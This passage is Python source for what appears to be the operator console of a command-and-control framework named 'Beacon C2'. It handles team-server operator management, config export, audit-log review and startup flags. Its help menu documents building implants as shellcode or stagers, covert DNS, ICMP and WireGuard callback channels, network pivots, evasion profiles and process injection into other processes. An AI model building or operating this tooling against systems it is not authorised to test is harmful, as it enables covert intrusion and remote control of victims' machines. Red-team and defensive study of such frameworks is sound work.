            self._multiplayer.set_enabled(False)
            print(f"{c['green']}[TEAM] multiplayer OFF — remote "
                  f"operator requests will 503{c['end']}")
        elif sub in ('status', ''):
            state = 'ON' if self._multiplayer.is_enabled() else 'OFF'
            print(f"[TEAM] multiplayer: {state}")
        else:
            print(f"{c['red']}Usage: multiplayer on|off|status"
                  f"{c['end']}")

    def _cmd_operator(self, parts):
        c = self.colors
        if self.operator_registry is None:
            print(f"{c['yellow']}[TEAM] team server not running "
                  f"(restart with --operator-port <port>){c['end']}")
            return
        sub = parts[1].lower() if len(parts) > 1 else 'list'
        reg = self.operator_registry

        if sub in ('list', 'ls'):
            try:
                entries = reg.list()
            except AttributeError:
                print(f"{c['red']}[TEAM] registry has no list() — "
                      f"adapt _cmd_operator to your API{c['end']}")
                return
            if not entries:
                print("[TEAM] no operators registered")
                return
            for e in entries:
                name = e.get('name') or e.get('cn') or '?'
                role = e.get('role', '?')
                flag = (f" {c['red']}(revoked){c['end']}"
                        if e.get('revoked') else "")
                print(f"  {name:<24} {role}{flag}")
            return

        if sub == 'add':
            if len(parts) < 3:
                print(f"{c['red']}Usage: operator add <name> "
                      f"[role]{c['end']}")
                return
            name = parts[2]
            role = parts[3].lower() if len(parts) > 3 else 'operator'
            if role not in ('viewer', 'guardian', 'operator', 'admin'):
                print(f"{c['red']}Role must be viewer, guardian, "
                      f"operator, or admin (local is not "
                      f"remote-assignable){c['end']}")
                return

            import getpass
            print(f"{c['dim']}Password is optional. Leave blank for "
                  f"cert-only authentication. A password adds a "
                  f"second factor: the operator receives the "
                  f"password out of band and is prompted for it "
                  f"on every client start.{c['end']}")
            try:
                pw1 = getpass.getpass(
                    f"  {c['green']}Password "
                    f"(blank = none){c['end']}: ")
                if pw1:
                    pw2 = getpass.getpass(
                        f"  {c['green']}Confirm{c['end']}: ")
                    if pw1 != pw2:
                        print(f"{c['red']}passwords do not match"
                              f"{c['end']}")
                        return
            except (EOFError, KeyboardInterrupt):
                print()
                print(f"{c['cyan']}cancelled{c['end']}")
                return

            try:
                reg.add(name, role=role, password=pw1)
            except Exception as exc:
                print(f"{c['red']}add failed: {exc}{c['end']}")
                return
            if self.audit_log is not None:
                self.audit_log.write(
                    operator='__local__', role='local',
                    source_ip='local', action='operator.add',
                    target=name,
                    detail=(f'role={role} '
                            f'password={"yes" if pw1 else "no"}'))
            print(f"{c['green']}[TEAM] added {name} as {role}"
                  f"{' (password required)' if pw1 else ''}"
                  f"{c['end']}")
            if pw1:
                print(f"  {c['yellow']}Hand the password to {name} "
                      f"out of band — never in the config file, "
                      f"never over the C2 channel.{c['end']}")
            return

        if sub in ('remove', 'rm'):
            if len(parts) < 3:
                print(f"{c['red']}Usage: operator remove <name>"
                      f"{c['end']}")
                return
            name = parts[2]
            try:
                entry = reg.get(name)
            except Exception:
                entry = None
            if entry is None:
                print(f"{c['red']}operator {name} not found"
                      f"{c['end']}")
                return
            if entry.get('role') == 'admin':
                print(f"{c['red']}refusing: {name} is admin. "
                      f"Demote to operator first, then remove."
                      f"{c['end']}")
                return
            try:
                reg.remove(name)
            except Exception as exc:
                print(f"{c['red']}remove failed: {exc}{c['end']}")
                return
            if self.audit_log is not None:
                self.audit_log.write(
                    operator='__local__', role='local',
                    source_ip='local', action='operator.remove',
                    target=name)
            print(f"{c['green']}[TEAM] removed {name}{c['end']}")
            return

        if sub in ('set-role', 'role'):
            if len(parts) < 4:
                print(f"{c['red']}Usage: operator set-role "
                      f"<name> <viewer|guardian|operator|admin>"
                      f"{c['end']}")
                return
            target = parts[2]
            new_role = parts[3].lower()
            try:
                reg.set_role(target, new_role)
            except Exception as exc:
                print(f"{c['red']}set-role failed: {exc}{c['end']}")
                return
            if self.audit_log is not None:
                self.audit_log.write(
                    operator='__local__', role='local',
                    source_ip='local', action='operator.set_role',
                    target=target, detail=f'role={new_role}')
            print(f"{c['green']}[TEAM] {target} → {new_role}"
                  f"{c['end']}")
            return

        if sub in ('passwd', 'password'):
            if len(parts) < 3:
                print(f"{c['red']}Usage: operator passwd <name>"
                      f"{c['end']}")
                return
            target = parts[2]
            entry = reg.get(target)
            if entry is None:
                print(f"{c['red']}{target} not found{c['end']}")
                return
            import getpass
            print(f"  {c['dim']}New password for {target}. Leave "
                  f"blank to clear the second factor (cert-only "
                  f"auth).{c['end']}")
            try:
                pw1 = getpass.getpass(
                    f"  {c['green']}New password "
                    f"(blank = clear){c['end']}: ")
                if pw1:
                    pw2 = getpass.getpass(
                        f"  {c['green']}Confirm{c['end']}: ")
                    if pw1 != pw2:
                        print(f"{c['red']}passwords do not match"
                              f"{c['end']}")
                        return
            except (EOFError, KeyboardInterrupt):
                print()
                print(f"{c['cyan']}cancelled{c['end']}")
                return
            try:
                reg.set_password(target, pw1)
            except Exception as exc:
                print(f"{c['red']}passwd failed: {exc}{c['end']}")
                return
            if self.audit_log is not None:
                self.audit_log.write(
                    operator='__local__', role='local',
                    source_ip='local',
                    action='operator.passwd', target=target,
                    detail=('cleared' if not pw1 else 'set'))
            if pw1:
                print(f"{c['green']}[TEAM] password updated for "
                      f"{target}{c['end']}")
                print(f"  {c['yellow']}Re-export their config "
                      f"(`operator export {target}`) — the "
                      f"derivation may have moved to a stronger "
                      f"algorithm.{c['end']}")
            else:
                print(f"{c['green']}[TEAM] password cleared for "
                      f"{target} (cert-only){c['end']}")
                print(f"  {c['yellow']}Re-export their config "
                      f"(`operator export {target}`).{c['end']}")
            return

        if sub in ('export', 'config'):
            if len(parts) < 3:
                print(f"{c['red']}Usage: operator export <name> "
                      f"[<output_path>]{c['end']}")
                return
            name = parts[2]
            try:
                entry = reg.get(name)
            except Exception:
                entry = None
            if entry is None:
                print(f"{c['red']}operator {name} not found"
                      f"{c['end']}")
                return
            if entry.get('revoked'):
                print(f"{c['red']}{name} is revoked — refusing to "
                      f"export a config for a revoked operator"
                      f"{c['end']}")
                return

            try:
                paths = reg.paths_for(name)
            except AttributeError:
                print(f"{c['red']}registry has no paths_for() — "
                      f"cannot locate certs{c['end']}")
                return

            op_dir = paths['dir']
            cert_path = paths['cert']
            key_path = paths['key']
            ca_path = paths['ca']

            missing = [p for p in (cert_path, key_path, ca_path)
                       if not p or not os.path.isfile(p)]
            if missing:
                print(f"{c['red']}missing files:{c['end']}")
                for p in missing:
                    print(f"  {c['red']}{p}{c['end']}")
                return

            if len(parts) > 3:
                out_path = parts[3]
            else:
                out_path = os.path.join(op_dir, f'{name}.cfg')

            host = self.host
            if host in ('0.0.0.0', '::'):
                detected = None
                try:
                    _probe = socket.socket(socket.AF_INET,
                                           socket.SOCK_DGRAM)
                    _probe.settimeout(1.0)
                    _probe.connect(('8.8.8.8', 1))
                    detected = _probe.getsockname()[0]
                    _probe.close()
                except Exception:
                    detected = None
                if detected and detected != '127.0.0.1':
                    host = detected
                    print(f"{c['cyan']}listener is bound to 0.0.0.0 "
                          f"— config will use autodetected "
                          f"server_host={host}. If not reachable "
                          f"from the operator's machine, edit "
                          f"server_host in the config."
                          f"{c['end']}")
                else:
                    host = 'localhost'
                    print(f"{c['yellow']}listener is bound to 0.0.0.0 "
                          f"and no outbound interface could be "
                          f"detected — config will use "
                          f"server_host=localhost. Edit the config "
                          f"before handing it to a remote operator."
                          f"{c['end']}")

            try:
                with open(ca_path, 'rb') as fh:
                    ca_pem = fh.read().decode('utf-8')
                with open(cert_path, 'rb') as fh:
                    client_cert = fh.read().decode('utf-8')
                with open(key_path, 'rb') as fh:
                    client_key = fh.read().decode('utf-8')
            except OSError as exc:
                print(f"{c['red']}read failed: {exc}{c['end']}")
                return

            problems = self._verify_export_bundle(
                name, ca_pem, client_cert)
            if problems:
                print()
                print(f"{c['red']}{c['bold']}[TEAM] this config "
                      f"will not authenticate against the running "
                      f"server:{c['end']}")
                for p in problems:
                    print(f"  {c['red']}✗{c['end']} {p}")
                print()
                print(f"  {c['yellow']}Fix the problems above and "
                      f"re-run `operator export {name}`. Writing "
                      f"the file anyway will produce a config that "
                      f"fails at the client with "
                      f"TLSV1_ALERT_UNKNOWN_CA.{c['end']}")
                print()
                if not sys.stdin.isatty():
                    print(f"{c['red']}stdin is not a terminal; "
                          f"refusing to write a broken config."
                          f"{c['end']}")
                    return
                try:
                    ans = input(
                        f"  {c['yellow']}Write the config anyway? "
                        f"[y/N]{c['end']} "
                    ).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print()
                    return
                if ans not in ('y', 'yes'):
                    print(f"{c['dim']}cancelled — no file written"
                          f"{c['end']}")
                    return
                print()

            import json as _json
            import hashlib as _hl
            import ssl as _ssl

            cfg = {
                'name': name,
                'role': entry.get('role', 'operator'),
                'server_host': host,
                'server_port': self.operator_port,
                'ca_pem': ca_pem,
                'client_cert': client_cert,
                'client_key': client_key,
            }

            try:
                with open(self.operator_registry.server_cert,
                          'rb') as fh:
                    _server_pem = fh.read().decode('utf-8')
                import ssl as _ssl_pin
                _der = _ssl_pin.PEM_cert_to_DER_cert(_server_pem)
                cfg['server_cert_sha256'] = _hl.sha256(
                    _der).hexdigest()
            except Exception:
                cfg['server_cert_sha256'] = ''
            if entry.get('auth_hash'):
                cfg['password_required'] = True
                cfg['auth_algo'] = entry.get(
                    'auth_algo', 'pbkdf2-sha256')
                cfg['auth_params'] = entry.get(
                    'auth_params', {'iters': 200_000})
                cfg['auth_salt'] = entry.get('auth_salt', '')

            blob = _json.dumps(cfg, indent=2)
            raw_bytes = blob.encode('utf-8')
            digest = _hl.sha256(raw_bytes).hexdigest()
            size = len(raw_bytes)

            def _cert_fp(pem_text):
                try:
                    return _hl.sha256(
                        _ssl.PEM_cert_to_DER_cert(pem_text)
                    ).hexdigest()
                except Exception:
                    return '?'

            cfg_ca_fp = _cert_fp(ca_pem)
            cert_fp = _cert_fp(client_cert)
            listener_fp = None
            if self.operator_listener is not None:
                listener_fp = getattr(
                    self.operator_listener,
                    'ca_fingerprint_loaded', None)

            print()
            print(f"  {c['dim']}server ca (this session):{c['end']} "
                  f"{listener_fp or '?'}")
            print(f"  {c['dim']}config ca (new file)    :{c['end']} "
                  f"{cfg_ca_fp}")
            if (cfg_ca_fp != '?' and listener_fp
                    and cfg_ca_fp == listener_fp):
                print(f"  {c['green']}✓ match{c['end']}")
            elif cfg_ca_fp != '?' and listener_fp:
                print(f"  {c['red']}✗ mismatch — the new config "
                      f"will not authenticate against the running "
                      f"server{c['end']}")
            print()

            try:
                parent = os.path.dirname(os.path.abspath(out_path))
                if parent:
                    os.makedirs(parent, exist_ok=True)
                with open(out_path, 'w', encoding='utf-8') as fh:
                    fh.write(blob)
                os.chmod(out_path, 0o600)
            except OSError as exc:
                print(f"{c['red']}write failed: {exc}{c['end']}")
                return

            if self.audit_log is not None:
                self.audit_log.write(
                    operator='__local__', role='local',
                    source_ip='local', action='operator.export',
                    target=name,
                    detail=f'sha256={digest} path={out_path}')

            role_str = entry.get('role', 'operator')
            print(f"{c['green']}✓{c['end']} exported config for "
                  f"{c['cyan']}{name}{c['end']} ({size} bytes)")
            print(f"  {c['dim']}path: {c['end']}{out_path}")
            print(f"  {c['dim']}role: {c['end']}{role_str}")
            print(f"  {c['dim']}config sha256 : {c['end']}"
                  f"{digest}")
            print(f"  {c['dim']}ca fingerprint: {c['end']}"
                  f"{cfg_ca_fp}")
            print(f"  {c['dim']}cert fingerprint: {c['end']}"
                  f"{cert_fp}")
            print(f"{c['yellow']}⚠  This is a credential for "
                  f"another operator. Anyone who reads this file "
                  f"can act as {name}.{c['end']}")
            print(f"{c['yellow']}   Hand it off out of band — "
                  f"never over the C2 channel, chat, or plain "
                  f"email.{c['end']}")
            return

        print(f"{c['red']}Usage: operator "
              f"list|add|remove|set-role|passwd|export{c['end']}")

    def _cmd_audit(self, parts):
        c = self.colors
        if self.audit_log is None:
            print(f"{c['yellow']}[TEAM] audit log not active"
                  f"{c['end']}")
            return

        sub = parts[1].lower() if len(parts) > 1 else 'tail'

        if sub == 'verify':
            ok, msg = self.audit_log.verify()
            colour = c['green'] if ok else c['red']
            print(f"{colour}[AUDIT] {msg}{c['end']}")
            return

        if sub == 'checkpoint':
            import json as _json
            try:
                with open(self.audit_log.checkpoint_path,
                          'r', encoding='utf-8') as fh:
                    cp = _json.load(fh)
                print(f"  hash: {cp.get('hash', '?')}")
                print(f"  mac : {str(cp.get('mac', ''))[:32]}…")
                print(f"  ts  : {cp.get('ts', '?')}")
            except (OSError, ValueError) as exc:
                print(f"{c['red']}[AUDIT] no checkpoint: {exc}"
                      f"{c['end']}")
            return

        limit = 20
        operator_filter = None
        action_filter = None
        beacon_filter = None
        denied_only = False
        show_full = False

        i = 1
        while i < len(parts):
            p = parts[i].lower()
            if p in ('tail', 'show', 'read'):
                i += 1
                if i < len(parts) and parts[i].isdigit():
                    limit = int(parts[i])
                    i += 1
            elif p == 'operator' and i + 1 < len(parts):
                operator_filter = parts[i + 1]
                i += 2
            elif p == 'action' and i + 1 < len(parts):
                action_filter = parts[i + 1].lower()
                i += 2
            elif p == 'beacon' and i + 1 < len(parts):
                beacon_filter = parts[i + 1].lstrip('#')
                i += 2
            elif p in ('denied', 'failed', 'non-ok'):
                denied_only = True
                i += 1
            elif p == 'full':
                show_full = True
                i += 1
            elif p.isdigit():
                limit = int(p)
                i += 1
            else:
                print(f"{c['red']}unknown audit filter: "
                      f"{parts[i]}{c['end']}")
                print(f"{c['yellow']}usage: audit [tail N] "
                      f"[operator NAME] [action VERB] [beacon ID] "
                      f"[denied] [full]{c['end']}")
                return

        filtered = bool(operator_filter or action_filter
                        or beacon_filter or denied_only)
        fetch = max(limit * 20, 500) if filtered else limit

        entries = self.audit_log.read(limit=fetch)
        if operator_filter:
            entries = [e for e in entries
                       if e.get('operator') == operator_filter]
        if action_filter:
            entries = [e for e in entries
                       if str(e.get('action', '')).lower()
                       == action_filter]
        if beacon_filter:
            suffix = '#' + beacon_filter
            entries = [e for e in entries
                       if str(e.get('target', '')).endswith(suffix)]
        if denied_only:
            entries = [e for e in entries
                       if e.get('outcome', 'ok') != 'ok']

        if not entries:
            print(f"{c['dim']}[AUDIT] no matching entries"
                  f"{c['end']}")
            return

        entries = entries[-limit:]

        header_bits = [f"last {len(entries)}"]
        if operator_filter:
            header_bits.append(f"operator={operator_filter}")
        if action_filter:
            header_bits.append(f"action={action_filter}")
        if beacon_filter:
            header_bits.append(f"beacon=#{beacon_filter}")
        if denied_only:
            header_bits.append("outcome!=ok")
        print(f"{c['cyan']}[AUDIT] {' '.join(header_bits)}"
              f"{c['end']}")

        for e in entries:
            self._print_audit_entry(e, show_full)

    def _print_audit_entry(self, e, show_full):
        """Render one audit entry. Two lines when a detail is
        present: a header with who/where/what/outcome, and an
        indented detail line. One line otherwise."""
        c = self.colors
        ts = str(e.get('ts', ''))[:19].replace('T', ' ')
        op = e.get('operator', '?')
        role = e.get('role', '?')
        ip = e.get('source_ip', '?') or '?'
        action = e.get('action', '?')
        target = e.get('target', '') or ''
        outcome = e.get('outcome', 'ok')
        detail = e.get('detail', '') or ''

        if outcome == 'ok':
            out_str = f"{c['green']}ok{c['end']}"
        elif outcome == 'denied':
            out_str = f"{c['red']}denied{c['end']}"
        elif outcome == 'throttled':
            out_str = f"{c['yellow']}throttled{c['end']}"
        else:
            out_str = f"{c['yellow']}{outcome}{c['end']}"

        who = f"{c['cyan']}{op}{c['end']}"
        if role and role != 'local':
            who += f"{c['dim']}@{role}{c['end']}"
        where = f"{c['dim']}({ip}){c['end']}"
        act = f"{c['bold']}{action}{c['end']}"
        tgt = f" {c['magenta']}{target}{c['end']}" if target else ""

        print(f"  {c['dim']}{ts}{c['end']}  "
              f"{who} {where}  {act}{tgt}  {out_str}")

        if detail:
            if not show_full and len(detail) > 100:
                text = detail[:97] + '...'
            else:
                text = detail
            print(f"      {c['dim']}{text}{c['end']}")

    def _print_help(self):
        c = self.colors
        print(f"""
{c['green']}BEACONS:{c['end']}
  beacons / bl            List active beacons
  beacon <ID>             Attach to a beacon console
  beacon-build [<os> <arch> [flags]]
                          Compile an agent (wizard if no args)
  beacon-build -c <file>  Compile from a JSON build config
  beacon-build --pivot-key-gen [<path>]
                          Generate the engagement-wide pivot
                          keypair. Writes PEM to <path> (default
                          mtls_certs/pivot.pem), prints both
                          halves, exits. No build is performed.
  beacon-rm <ID>          Forget a beacon from the registry
  multiplayer on|off|status
                          Toggle remote operator access (team server)
  operator list|add|remove|set-role|passwd|export
                          Manage team server operators (team server)
                          `operator add` and `operator passwd`
                          prompt for a password; blank = cert-only
                          authentication. New passwords use scrypt
                          (128 MiB working set). `operator export`
                          writes a client config file.
  halt [--force] [shutdown|reboot]
                          Run the shutdown sequence now: stop
                          listeners, wipe state directories,
                          optionally power off or reboot, exit.
                          Confirm prompt unless --force.
  deadman status|arm|arm-until|reset|disable|warn|halt
                          Manage the auto-shutdown watchdog.
                          `deadman halt <mode>` sets what runs
                          after the wipe when the timer fires.
                          `deadman status` shows window, idle,
                          remaining, and the source of the last
                          activity. `deadman arm 2h` arms it with
                          a fresh window. `deadman disable` clears
                          it. Configuration persists to
                          team_ca/deadman.json.
  rotate-cookies          Regenerate the cookie key; every beacon
                          re-checks-in on its next poll (team server)
  audit [tail N] [operator NAME] [action VERB] [beacon ID] [denied] [full]
                          Inspect the audit log (team server)
  audit verify            Verify the hash chain
  audit checkpoint        Show the current checkpoint anchor
  help                    This menu
  exit / quit             Shutdown

{c['green']}BUILD FLAGS:{c['end']}
  --format <exe|dll|elf|shellcode|stager>
  --transport <http|dns|doh|icmp|smb|tcp|quic|websocket|wireguard>
                                 or comma-separated failover list
                                 drawn from http,dns,doh
                                 default: http
  --failover-after <N>           rotate after N consecutive failures
                                 on a multi-transport build

{c['green']}HTTP, QUIC, WEBSOCKET:{c['end']}
  --url <https://host:port>      callback URL. Required for http,
                                 quic, and websocket builds. The
                                 websocket client converts the scheme
                                 to wss:// at dial time.
  --c2-profile <name>            C2 profile under profiles/c2/
                                 (applies to http, quic, websocket,
                                 dns, doh)
  --tls-profile <go|chrome|firefox|safari>
                                 ClientHello fingerprint. Applies
                                 to http, doh, and websocket;
                                 accepted but ignored on quic and
                                 wireguard.

{c['green']}DNS, DOH:{c['end']}
  --dns-domain <zone>            authoritative zone (dns and doh)
  --dns-resolver <host:port>     dns transport: resolver
                                 (default: system resolver)
  --doh-resolver <url>           doh transport: DoH endpoint
                                 (default: https://cloudflare-dns.com/dns-query)
  --doh-host <host>              doh transport: Host: header override
  --doh-ua <ua>                  doh transport: User-Agent override

{c['green']}ICMP (Linux only):{c['end']}
  --icmp-host <ipv4>             icmp transport: C2's public IPv4
                                 The handler must be started with
                                 --icmp and CAP_NET_RAW.

{c['green']}WIREGUARD:{c['end']}
  --wireguard-server-pubkey <base64>
                                 The server's WireGuard public key,
                                 printed by the handler at startup.
  --wireguard-server-addr <host:port>
                                 The server's UDP listener, as
                                 reachable from the target.
  --wireguard-agent-privkey <base64>
                                 The agent's WireGuard private key,
                                 generated out of band with
                                 `wg genkey`.
  --wireguard-tunnel-ip <ipv4>   The agent's IPv4 inside the tunnel.
                                 10.99.0.2 for the first agent.
  --wireguard-server-tunnel-ip <ipv4>
                                 The server's IPv4 inside the tunnel.
                                 Default 10.99.0.1. Must match the
                                 handler's --wireguard-server-ip.
  --wireguard-inner-port <n>     HTTPS port the agent dials inside
                                 the tunnel. Defaults to 8881. Must
                                 match the handler's --beacon-port.

{c['green']}SMB PIVOT (Windows only):{c['end']}
  --smb-pipe <name>              smb child: parent's pipe name
  --smb-relay-pipe <name>        smb parent: pipe to listen on

{c['green']}TCP BIND PIVOT:{c['end']}
  --tcp-bind <host:port>         tcp child: listen address
  --tcp-token <hex>              tcp child: 64-hex shared secret
  --tcp-token-gen                tcp child: generate and print a token
  --tcp-relay <host:port>        tcp parent: child listener to dial
  --tcp-relay-token <hex>        tcp parent: must match child token

{c['green']}TCP REVERSE PIVOT:{c['end']}
  --tcp-rev-listen <host:port>   reverse parent: TCP port to listen on
  --tcp-rev-target <host:port>   reverse child: parent listener to dial
  --tcp-rev-token <hex>          reverse child or parent: 64-hex
                                 shared secret; both ends must match
  --tcp-rev-token-gen            generate a token and print it

{c['green']}PIVOT KEYPAIR:{c['end']}
  --pivot-key <path>             Pivot keypair PEM. Required for
                                 every SMB or TCP build, parent or
                                 child. Generate once with
                                 --pivot-key-gen and pass the same
                                 file to every SMB and TCP build.
  --pivot-key-gen [<path>]       Generate a fresh pivot keypair,
                                 write it to <path> (default
                                 mtls_certs/pivot.pem), print both
                                 halves, and exit — no build is
                                 performed.

{c['green']}AGENT IDENTITY KEYPAIR:{c['end']}
  --agent-keypair-path <path>    ECDSA P-256 signing key embedded
                                 in the binary. Defaults to
                                 .keys/agent/agent_signing.key.
                                 The public half is presented at
                                 check-in and pinned by the server,
                                 so a different key on a rebuild
                                 is refused as an impersonation
                                 attempt. Leave unset unless a
                                 per-engagement key is required.

  --profile <default|stealth|opsec|paranoid>
  --kill-days <N>                (0 = no deadline)
  --work-hours HH:MM-HH:MM       target local time; wrapped OK
  --work-off                     24/7 polling
  --mtls                         embed handler's mtls_certs/
  --mtls-dir <dir>               embed from a specific PKI directory
  --mtls-cert / --mtls-key / --mtls-ca
                                 override individual PEM paths
  --stage-key <hex>              stager: 32-byte AES key (blank = auto)
  --stage-name <name>            stager: payload name to fetch
  --inject                       Embed loader-wrapped shellcode and
                                 rebuild, adding `migrate <pid>` support.
                                 Windows: requires Donut on PATH or a
                                 vendored copy at beacon/bin/donut.
                                 Linux: requires the vendored ELF-loader
                                 stub at beacon/bin/inject_linux_stub.bin.
                                 Costs ~13 MB of final binary size.
  --inject-method <name>         Build-time default for `migrate <pid>`
                                 when no --method flag is supplied.
                                 Values: default (CreateRemoteThread
                                 on Windows, ptrace on Linux), apc
                                 (remote APC injection, Windows only,
                                 requires --inject). threadpool, fiber,
                                 and callback are refused with an error
                                 naming the correct verb.
  --verbose                      diagnostic stderr on target
                                 (debug builds only)
""")


# ---------------------------------------------------------------------
# Entry point

def main():
    parser = argparse.ArgumentParser(
        description='Beacon C2 — pull-based command and control')
    parser.add_argument(
        '-H', '--host', default='0.0.0.0',
        help='Bind address (default 0.0.0.0)')
    parser.add_argument(
        '--beacon-port', type=int, default=8881,
        help='Beacon listener port (default 8881)')
    parser.add_argument(
        '--beacon-quic-port', type=int, default=None,
        help='Enable the QUIC / HTTP/3 transport on this UDP port. '
             'Requires aioquic (pip install aioquic). Runs alongside '
             'the TCP HTTPS listener on the same certificate. Pass 0 '
             'to disable explicitly.')
    parser.add_argument(
        '--beacon-mtls-ca', default=None,
        help='CA file used to verify beacon client certificates. '
             'When set, the listener requires mTLS.')
    parser.add_argument(
        '--beacon-mtls-server-cert', default=None,
        help='Server certificate served by the beacon listener. '
             'Must chain to the CA the beacon agent embedded at '
             'build time.')
    parser.add_argument(
        '--beacon-mtls-server-key', default=None,
        help='Private key for --beacon-mtls-server-cert.')
    parser.add_argument(
        '--beacon-mtls-dir', default=None,
        help='Directory containing ca.pem, server-mtls.pem, and '
             'server-mtls.key. Implies --beacon-mtls-ca. Overrides '
             'the individual --beacon-mtls-* flags.')
    parser.add_argument(
        '--beacon-profile', default=None,
        help='Narrow the listener to a single C2 profile under '
             'profiles/c2/. Default: auto-discover every profile.')
    parser.add_argument(
        '-c', '--cert',
        default=os.path.join('tls_certs', 'server.pem'),
        help='Plain TLS certificate (used when mTLS is not configured)')
    parser.add_argument(
        '-k', '--key',
        default=os.path.join('tls_certs', 'server.key'),
        help='Plain TLS private key')
    parser.add_argument(
        '--mtls-ca-cert',
        default=os.path.join('mtls_certs', 'ca.pem'),
        help='Default mTLS CA for build-time embedding')
    parser.add_argument(
        '--mtls-ca-key',
        default=os.path.join('mtls_certs', 'ca.key'))
    parser.add_argument(
        '--mtls-server-cert',
        default=os.path.join('mtls_certs', 'server-mtls.pem'))
    parser.add_argument(
        '--mtls-server-key',
        default=os.path.join('mtls_certs', 'server-mtls.key'))
    parser.add_argument(
        '--mtls-client-cert',
        default=os.path.join('mtls_certs', 'client.pem'))
    parser.add_argument(
        '--mtls-client-key',
        default=os.path.join('mtls_certs', 'client.key'))
    parser.add_argument(
        '--operator-port', type=int, default=None,
        help='Enable the team server operator listener on this port. '
             'Multiplayer starts disabled; use `multiplayer on` in '
             'the console to accept remote connections.')
    parser.add_argument(
        '--operator-host', default=None,
        help='Bind address for the operator listener. When '
             '--operator-port is set and this flag is omitted, the '
             'listener binds to 0.0.0.0 (every interface). Pass '
             '127.0.0.1 explicitly to restrict the listener to '
             'loopback. A public bind is worth a firewall rule that '
             'limits the port to your operators\' source IPs.')
    parser.add_argument(
        '--no-audit-verify', action='store_true',
        help='Skip audit chain verification at startup. Only use if '
             'the log is known to be corrupt.')
    parser.add_argument(
        '--multiplayer-off', action='store_true',
        help='Start with the operator gate closed. The listener '
             'binds and answers every request with 503 until '
             '`multiplayer on` is run in the console. Without this '
             'flag, setting --operator-port also opens the gate.')
    parser.add_argument(
        '--dns-port', type=int, default=None,
        help='Enable the DNS transport on this port (usually 53). '
             'Requires --dns-domain. Runs alongside HTTP.')
    parser.add_argument(
        '--dns-domain', default=None,
        help='Zone for the DNS transport, e.g. c2.example.com. '
             'The beacon queries <verb>.<sid>.<payload>.<domain>.')
    parser.add_argument(
        '--icmp', action='store_true',
        help='Enable the ICMP echo transport. Requires CAP_NET_RAW '
             'on Linux (run with sudo, or setcap cap_net_raw on the '
             'python binary). Not supported on Windows.')
    parser.add_argument(
        '--ws-port', type=int, default=None,
        help='Enable the WebSocket (wss://) transport on this TCP '
             'port. Requires simple-websocket '
             '(pip install simple-websocket). Runs alongside the '
             'HTTP listener on its own socket; the same certificate '
             'and CA material are reused.')
    parser.add_argument(
        '--ws-host', default=None,
        help='Bind address for the WebSocket listener. Defaults to '
             'the same value as --host.')
    parser.add_argument(
        '--wireguard', action='store_true',
        help='Enable the WireGuard (userspace) transport. Requires '
             'root or CAP_NET_ADMIN and pyroute2 '
             '(pip install pyroute2). The server generates its own '
             'keypair on first run and prints the public half — '
             'copy that value into every agent build.')
    parser.add_argument(
        '--wireguard-port', type=int, default=51820,
        help='UDP port for the WireGuard listener (default 51820).')
    parser.add_argument(
        '--wireguard-subnet', default='10.99.0.0/24',
        help='Tunnel subnet. The server takes the first usable '
             'address (default 10.99.0.1).')
    parser.add_argument(
        '--wireguard-server-ip', default='10.99.0.1',
        help='Server IP inside the tunnel (default 10.99.0.1).')
    args = parser.parse_args()

    h = BeaconHandler(
        host=args.host,
        beacon_port=args.beacon_port,
        certfile=args.cert,
        keyfile=args.key,
        mtls_ca_cert=args.mtls_ca_cert,
        mtls_ca_key=args.mtls_ca_key,
        mtls_server_cert=args.mtls_server_cert,
        mtls_server_key=args.mtls_server_key,
        mtls_client_cert=args.mtls_client_cert,
        mtls_client_key=args.mtls_client_key,
    )

    h.beacon_mtls_ca = args.beacon_mtls_ca
    h.beacon_mtls_dir = args.beacon_mtls_dir
    h.beacon_mtls_server_cert = args.beacon_mtls_server_cert
    h.beacon_mtls_server_key = args.beacon_mtls_server_key
    h.beacon_c2_profile = args.beacon_profile
    h.no_audit_verify = args.no_audit_verify
    h.operator_port = args.operator_port
    h.multiplayer_off = args.multiplayer_off
    if args.operator_host is None:
        h.operator_host = (
            '0.0.0.0' if args.operator_port else '127.0.0.1')
    else:
        h.operator_host = args.operator_host
    h.dns_port = args.dns_port
    h.dns_domain = args.dns_domain
    h.icmp_enabled = args.icmp
    h.ws_port = args.ws_port
    h.ws_host = args.ws_host
    h.wireguard_enabled = args.wireguard
    h.wireguard_port = args.wireguard_port
    h.wireguard_subnet = args.wireguard_subnet
    h.wireguard_server_ip = args.wireguard_server_ip

    if args.beacon_quic_port is None or args.beacon_quic_port == 0:
        h.quic_port = None
    else:
        h.quic_port = args.beacon_quic_port

    h.start()


if __name__ == '__main__':
    main()